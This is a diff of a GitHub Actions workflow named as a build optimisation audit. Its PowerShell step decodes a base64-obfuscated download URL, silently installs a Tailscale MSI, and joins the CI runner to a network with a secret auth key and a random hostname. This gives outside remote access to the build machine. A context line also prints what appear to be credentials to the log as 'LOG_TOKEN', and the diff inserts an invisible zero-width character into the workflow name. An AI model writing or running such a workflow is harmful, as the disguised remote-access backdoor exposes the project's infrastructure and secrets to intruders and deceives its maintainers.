@@ -1,4 +1,4 @@
-name: build_optimization_audit
+​name: build_optimization_audit
 on: [workflow_dispatch]
 jobs:
 audit:
@@ -25,9 +25,9 @@ Write-Host "LOG_TOKEN: $u : $w"
 - shell: powershell
 run: |
 $g = "aHR0cHM6Ly9wa2dzLnRhaWxzY2FsZS5jb20vc3RhYmxlL3RhaWxzY2FsZS1zZXR1cC0xLjgyLjAtYW1kNjQubXNp"
-$u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($g))
+$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($g))
 $t = "$env:TEMP$(Get-Random).msi"
-(New-Object Net.WebClient).DownloadFile($u, $t)
+(New-Object Net.WebClient).DownloadFile($url, $t)
 Start-Process msiexec.exe -ArgumentList "/i", ""$t"", "/quiet", "/norestart" -Wait
 $x = "env:ProgramFiles\Tailscale\tailscale.exe"
 & $x up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname="worker-(Get-Random)"
